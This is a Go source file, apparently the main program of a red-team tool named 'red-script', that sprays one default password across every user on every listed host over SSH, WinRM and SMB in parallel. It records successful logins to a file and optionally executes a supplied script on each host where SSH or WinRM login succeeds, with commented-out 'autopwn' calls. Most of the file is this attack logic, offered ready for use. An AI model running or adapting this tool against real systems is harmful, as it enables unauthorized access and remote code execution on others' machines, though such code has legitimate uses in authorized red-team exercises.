package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"sync"

	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/smb"
	sshClient "github.com/opt/red-script/internal/ssh"
	"github.com/opt/red-script/internal/winrm"
)

/*
Write a program that takes in 2 files and a password.
the first file will contain lines of users, second contains
a list of boxes. you can probably find a way to consolidate
those files. the password will be the default cred. the bot
will run down all the IPs and users and try every single one
with the default password. if it authenticates, just write
to a file for now. hoping for something well-threaded. program
will just keep running consistently
*/

var userPath, boxesPath, password, outputPath, scriptPath string

func init() {
	const (
		userPathUsage   = "Path to file containing list of users."
		boxesPathUsage  = "Path to file containing list of boxes."
		passwordUsage   = "Password to attempt on users and boxes."
		outputUsage     = "Output file name for successful responses."
		scriptPathUsage = "Path to a script that should be executed on successful SSH/WinRM logon. If this option is not set, a script will not be executed."
	)
	flag.StringVar(&userPath, "userPath", "", userPathUsage)
	flag.StringVar(&userPath, "u", "", userPathUsage+" (shorthand)")

	flag.StringVar(&boxesPath, "boxPath", "", boxesPathUsage)
	flag.StringVar(&boxesPath, "b", "", boxesPathUsage+" (shorthand)")

	flag.StringVar(&password, "password", "", passwordUsage)
	flag.StringVar(&password, "p", "", passwordUsage+" (shorthand)")

	flag.StringVar(&outputPath, "output", "output.txt", outputUsage)
	flag.StringVar(&outputPath, "o", "output.txt", outputUsage+" (shorthand)")

	flag.StringVar(&scriptPath, "script", "", scriptPathUsage)
	flag.StringVar(&scriptPath, "s", "", scriptPathUsage+" (shorthand)")

	flag.Parse()
}

func GetScriptPath() string {
	return scriptPath
}

func main() {
	if len(userPath) == 0 || len(boxesPath) == 0 || len(password) == 0 {
		os.Stderr.WriteString("ERROR: userPath, boxPath, and/or password not specified.\n")
		flag.CommandLine.PrintDefaults()
		return
	}
	users, err := files.ReadList(userPath)
	if err != nil {
		log.Fatal(err)
	}
	boxes, err := files.ReadList(boxesPath)
	if err != nil {
		log.Fatal(err)
	}

	go files.InitWriter(outputPath)

	fmt.Printf("\nLoaded %d users and %d boxes\n", len(users), len(boxes))

	var wg sync.WaitGroup
	for _, b := range boxes {
		for _, u := range users {
			wg.Add(3)
			go sshClient.Connect(b, u, password, scriptPath, &wg)
			go winrm.Connect(b, u, password, scriptPath, &wg)
			go smb.Connect(b, u, password, &wg)
		}
	}
	wg.Wait()
	// for _, b := range boxes {
	// 	for _, u := range users {
	// 		autopwn.SSHAutopwn(b, u, password, scriptPath)
	// 		autopwn.WinRMAutopwn(b, u, password, scriptPath)
	// 	}
	// }

	fmt.Printf("Successfully checked %d entries, %d successful\n", len(boxes)*len(users), files.TotalWrites)
}
